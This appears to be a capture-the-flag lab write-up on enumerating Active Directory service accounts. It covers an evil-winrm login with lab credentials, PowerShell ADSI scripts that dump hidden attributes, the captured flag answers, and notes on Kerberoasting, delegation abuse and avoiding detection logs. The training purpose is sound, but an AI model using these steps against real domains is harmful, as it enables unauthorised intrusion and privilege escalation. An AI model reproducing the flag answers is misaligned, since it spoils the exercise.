
1. Service Account Enumeration: Investigating Misconfigured Service Account Attributes

Objective:

Service accounts are often poorly maintained. Sensitive information is sometimes stored directly in user attributes visible to any authenticated domain user. Your goal is to find what has been left behind.

Your mission:

Focus on service accounts (accounts with prefixes like svc) Focus on service accounts and inspect their attributes carefully Look beyond standard properties

Hint: The flag is stored in an attribute that is not shown by default enumeration. You need to explicitly request extended properties to retrieve it

Repo:

    GitHub repository: holbertonschool-cyber_security
    Directory: Active_directory/0x01-AD_Basics_And_Concepts
    File: 1-flag.txt

=======================================================================================================================================================================

Stage 1: Initial Foothold via Evil-WinRM
The Concept: What is WinRM?

Windows Remote Management (WinRM) is a native Windows protocol that enables administrators to execute PowerShell commands remotely on a server. It typically listens on port 5985 (HTTP) or 5986 (HTTPS).  

During an assessment, if valid user credentials are compromised (in this instance, labuser), an operator can leverage tools like evil-winrm from an external attack platform (such as Kali Linux) to instantiate an interactive, remote PowerShell session.
Execution Input (Kali Linux Host)
Bash

evil-winrm -i 10.10.X.X -u labuser -p 'Password123!'

Terminal Output
PowerShell

Evil-WinRM shell v3.5
Info: Establishing connection to 10.10.X.X...
Info: Connection established!

PS C:\Users\labuser>

Technical Explanation

The session establishes a remote, interactive loop running within the security context of the labuser account. Every command executed within this shell runs natively on the target Windows system.
Stage 2: Initial Identification of Service Accounts
The Concept: Finding Target Object Hints

During post-exploitation enumeration, inspecting environmental footprints (such as local registry entries, user properties, or session variables) revealed a comma-separated string containing explicit references to service accounts:
Plaintext

CN=svc_deploy;svc_web;SvcBackup;SvcWeb

Technical Explanation

Active Directory relies on LDAP (Lightweight Directory Access Protocol) paths to query database objects. The raw string identifies four targeted Common Names (CNs): svc_deploy, svc_web, SvcBackup, and SvcWeb.

    [!WARNING]
    The Architectural Problem: Active Directory cannot securely query an object's extended properties using only its short Common Name. It requires the Distinguished Name (DN)—the exact structural path of the object inside the domain database directory tree (e.g., CN=SvcBackup,OU=ServiceAccts,DC=PENTESTLAB,DC=local).

Because the precise Organizational Units (OUs) housing these accounts were initially unknown, an automated query was necessary to dynamically resolve their exact paths.
Stage 3: Dynamic Directory Search & Advanced Attribute Enumeration

To locate the absolute DN for all four accounts and extract their operational attributes, an advanced PowerShell lookup loop was executed directly inside the remote shell. This approach relies entirely on built-in .NET accelerators to avoid generating high-signature process creation logs (like spinning up net.exe or dsquery.exe).
Execution Input (Pasted into Evil-WinRM)
PowerShell

# 1. Instantiate the searcher object
$Searcher = [ADSISearcher]""

# 2. Filter for user accounts starting with "svc"
$Searcher.Filter = "(&(objectCategory=person)(objectClass=user)(cn=svc*))"

# 3. Pull the exact DistinguishedName property for any accounts found
$Searcher.FindAll() | ForEach-Object { $_.Properties.distinguishedname }

Resolution Output
Plaintext

CN=svc_deploy,CN=Users,DC=PENTESTLAB,DC=local
CN=svc_web,CN=Users,DC=PENTESTLAB,DC=local
CN=SvcBackup,OU=ServiceAccts,DC=PENTESTLAB,DC=local
CN=SvcWeb,OU=ServiceAccts,DC=PENTESTLAB,DC=local

Comprehensive Automated Enumeration Script

With the targets confirmed, the following script was executed to bind directly to each object path, force the calculation of constructed/hidden attributes, and dump all properties to the terminal.
PowerShell

$Accounts = @("svc_deploy", "svc_web", "SvcBackup", "SvcWeb")
foreach ($Name in $Accounts) {
    Write-Output "=================================================="
    Write-Output "Searching attributes for: $Name"
    Write-Output "=================================================="
    
    # Locate the absolute Distinguished Name dynamically
    $Searcher = [ADSISearcher]"(&(objectClass=user)(cn=$Name))"
    $Result = $Searcher.FindOne()
    
    if ($Result) {
        $DN = $Result.Properties.distinguishedname[0]
        
        # Bind directly to the object path and force operational/hidden attribute calculation
        $AccountObject = [ADSI]"LDAP://$DN"
        $AccountObject.RefreshCache(@("*", "+"))
        
        # Dump properties 
        $AccountObject | Select-Object -Property *
    } else {
        Write-Output "Could not locate Distinguished Name for $Name"
    }
}

Technical Breakdown of the Automation Mechanics

    [ADSISearcher]"(&(objectClass=user)(cn=$Name))": Utilizes the highly performant DirectorySearcher .NET class to execute a global LDAP query filter: "Find objects matching type user AND where the common name exactly matches our current tracking variable."

    .FindOne(): Executes the directory search index lookups and halts immediately upon finding the first valid metadata record.  

    [ADSI]"LDAP://$DN": Instantiates a DirectoryEntry bind directly to the absolute target directory structure.

    .RefreshCache(@("*", "+")): Instructs the Domain Controller to pull down standard properties (*) alongside operational/constructed properties (+). Constructed attributes are calculated dynamically by the domain controller and are traditionally omitted from standard queries to reduce domain bandwidth consumption.  

Stage 4: Attribute Log Analysis & Vulnerability Identification

The script dumped complete attribute tables for the discovered accounts. Comprehensive analysis of the returned data blocks revealed multiple critical vulnerabilities and data exposures.
Object 1: svc_deploy
Plaintext

objectClass          : {top, person, organizationalPerson, user}
cn                   : {svc_deploy}
description          : {Deployment service account}
distinguishedName    : {CN=svc_deploy,CN=Users,DC=PENTESTLAB,DC=local}
nTSecurityDescriptor : {System.__ComObject}
name                 : {svc_deploy}
objectGUID           : {213 210 238 127 241 144 156 75 160 10 23 179 250 183 29 99}
sAMAccountName       : {svc_deploy}
sAMAccountType       : {805306368}
userPrincipalName    : {svc_deploy@pentestlab.local}
objectCategory       : {CN=Person,CN=Schema,CN=Configuration,DC=PENTESTLAB,DC=local}
Parent               : LDAP://CN=Users,DC=PENTESTLAB,DC=local
Path                 : LDAP://CN=svc_deploy,CN=Users,DC=PENTESTLAB,DC=local
SchemaClassName      : user

    [!NOTE]
    Analysis: Standard deployment account properties. No immediate high-severity configuration flaws identified within the baseline structural properties.

Object 2: svc_web (Kerberos Constrained Delegation Flaw)
Plaintext

objectClass              : {top, person, organizationalPerson, user}
cn                       : {svc_web}
description              : {Web service account}
distinguishedName        : {CN=svc_web,CN=Users,DC=PENTESTLAB,DC=local}
name                     : {svc_web}
sAMAccountName           : {svc_web}
userPrincipalName        : {svc_web@pentestlab.local}
servicePrincipalName     : {HTTP/webserver.pentestlab.local}
msDS-AllowedToDelegateTo : {FLAG5{f6c8d9e0a1b23456abcdefabcdefabcdef112233445566778899aabbccddeeff_powerview}}
Parent                   : LDAP://CN=Users,DC=PENTESTLAB,DC=local
Path                     : LDAP://CN=svc_web,CN=Users,DC=PENTESTLAB,DC=local
SchemaClassName          : user

Security Analysis

    Kerberoasting Exposure: The presence of the servicePrincipalName property (HTTP/webserver.pentestlab.local) denotes that this account is structurally mapped to a service instance. This permits any authenticated domain account to request a TGS (Ticket Granting Service) ticket for this SPN and extract the ticket's underlying encrypted blob for offline cryptographic brute-force attacks.

    Constrained Delegation Misconfiguration: The population of the constructed attribute msDS-AllowedToDelegateTo confirms that Kerberos Constrained Delegation (KCD) is configured.

Exploitation Vector

If an operator compromises the cleartext password or the NetNTLM/NT hash of the svc_web account, they can manipulate extended extensions (S4U2self / S4U2proxy) via exploitation toolsets. This allows the attacker to forge an authentication ticket to impersonate any domain user (including a Domain Administrator) directly to the backend target specified: HTTP/webserver.pentestlab.local.

    [!KEY]
    Captured Flag: FLAG5{f6c8d9e0a1b23456abcdefabcdefabcdef112233445566778899aabbccddeeff_powerview}

Object 3: SvcBackup (Information Disclosure via Metadata)
Plaintext

objectClass          : {top, person, organizationalPerson, user}
cn                   : {SvcBackup}
title                : {Service}
description          : {FLAG1{747fb213581c9cd487fc6e77bf4e54aa6321839fe023b0551ceef706cbc6}}
distinguishedName    : {CN=SvcBackup,OU=ServiceAccts,DC=PENTESTLAB,DC=local}
sAMAccountName       : {svc.backup}
userPrincipalName    : {svc.backup@pentestlab.local}
Parent               : LDAP://OU=ServiceAccts,DC=PENTESTLAB,DC=local
Path                 : LDAP://CN=SvcBackup,OU=ServiceAccts,DC=PENTESTLAB,DC=local
SchemaClassName      : user

Security Analysis

    Information Disclosure: System administrators frequently place hardcoded cleartext credentials, legacy initialization notes, or deployment tracking flags within the object's description field.

    Because the Active Directory schema permits all standard authenticated domain users (Domain Users) to read user object attributes by default, storing sensitive information here represents a severe security data leak.

    [!KEY]
    Captured Flag: FLAG1{747fb213581c9cd487fc6e77bf4e54aa6321839fe023b0551ceef706cbc6}

Object 4: SvcWeb
Plaintext

objectClass          : {top, person, organizationalPerson, user}
cn                   : {SvcWeb}
title                : {Service}
distinguishedName    : {CN=SvcWeb,OU=ServiceAccts,DC=PENTESTLAB,DC=local}
sAMAccountName       : {svc.web}
userPrincipalName    : {svc.web@pentestlab.local}
Parent               : LDAP://OU=ServiceAccts,DC=PENTESTLAB,DC=local
Path                 : LDAP://CN=SvcWeb,OU=ServiceAccts,DC=PENTESTLAB,DC=local
SchemaClassName      : user

    [!NOTE]
    Analysis: Structural properties conform to standard schema restrictions; no active anomalies or credential disclosures identified in this specific user block.
